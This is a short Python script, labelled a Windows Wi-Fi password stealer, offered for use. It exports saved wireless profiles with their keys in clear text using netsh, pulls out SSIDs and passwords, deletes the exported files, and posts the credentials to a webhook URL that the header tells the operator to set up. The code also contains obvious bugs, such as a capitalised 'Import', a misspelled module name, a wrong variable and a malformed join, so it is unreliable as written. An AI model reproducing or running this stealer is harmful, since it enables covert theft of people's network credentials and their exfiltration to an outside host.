#Windows Wi-Fi password stealer script in Python
#For this to work, you will need to setup a webhook site, replace the URL on line No.9, and uncomment line No.9

Import subprocess, os, sys, requests
Import xml.etree.ElemtTree as ET

#stealer URL
#url = 'https://webhook.site/2b41d682-0743-42a0-bac1-dfb7d119716c'

#Lists and dictionaries
wifi_files = []
payload = {"SSID": [], "Password": []}

#Use Python to execute a Windows command = netsh
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Do the hackies: Append Wi-Fi XML files to wifi_files list
for filename in os.listdir(path):
        if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
            wifi_files.append(filename)

#Parse Wi-Fi XML files
for file in wifi_files:
                tree = ET.Parse(files)
                root = tree.getroot()
                SSID = root[0].text
                password = root[4][0][1][2].text
                payload["SSID"].append(SSID)
                payload["Password"].append(password)
                os.remove(file)

#Send the hackies
payload_str = " & ".join("%s=%s % (k,v) for k,v in payload.items")
r = requests.post(url, params='format=json', data=payload_str)
